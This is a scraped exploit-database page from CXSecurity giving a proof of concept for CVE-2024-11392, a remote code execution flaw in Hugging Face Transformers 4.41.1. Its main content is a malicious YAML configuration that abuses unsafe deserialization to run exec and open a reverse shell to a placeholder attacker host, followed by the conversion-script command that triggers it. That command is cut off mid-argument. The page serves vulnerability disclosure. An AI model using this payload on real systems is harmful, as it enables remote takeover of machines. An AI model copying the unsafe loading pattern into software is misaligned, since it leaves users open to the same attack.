---
title: Hugging Face Transformers MobileViTV2 4.41.1 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2025050014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-06
fetch_date: 2025-10-06T22:24:42.352815
---

# Hugging Face Transformers MobileViTV2 4.41.1 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Hugging Face Transformers MobileViTV2 4.41.1 Remote Code Execution (RCE)** **2025.05.05**  Credit:  **[The Kernel Panic](https://cxsecurity.com/author/The%2BKernel%2BPanic/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-11392](https://cxsecurity.com/cveshow/CVE-2024-11392/ "Click to see CVE-2024-11392")**  CWE: **N/A** | |

# Exploit Title: Hugging Face Transformers MobileViTV2 RCE
# Date: 29-11-2024
# Exploit Author: The Kernel Panic
# Vendor Homepage: https://huggingface.co/
# Software Link: https://github.com/huggingface/transformers/releases
# Version: 4.41.1
# Tested on: Linux, Windows, Mac
# CVE : CVE-2024-11392
# Code flow from input to the vulnerable condition:
# 1. The user downloads a third-party ml-cvnet model alongside its configuration file.
# 2. The user runs the convert\_mlcvnets\_to\_pytorch.py script and passes the configuration file to it.
# 3. The convert\_mlcvnets\_to\_pytorch.py script de-serializes the configuration file and executes the malicious code.
# POC
# Create a malicious yaml configuration file called "transformers\_exploit.yaml" like shown below.
# Note: Remember to change the 'ATTACKER\_IP' and 'ATTACKER\_PORT'.
!!python/object/new:type
args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
listitems: "\_\_import\_\_('socket').socket(socket.AF\_INET, socket.SOCK\_STREAM).connect(('ATTACKER\_IP', ATTACKER\_PORT));import os,pty;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(('ATTACKER\_IP',ATTACKER\_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')"
# Run the convert\_mlcvnets\_to\_pytorch.py script and pass the transformers\_exploit.yaml file to --orig\_config\_path
> python convert\_mlcvnets\_to\_pytorch.py --orig\_checkpoint\_path dummy\_checkpoint.pt --or
# Note: The dummy\_checkpoint.pt can be left as an empty file, dummy\_output as an empty directory , and "task" as any of the options metioned in the script.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050014)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top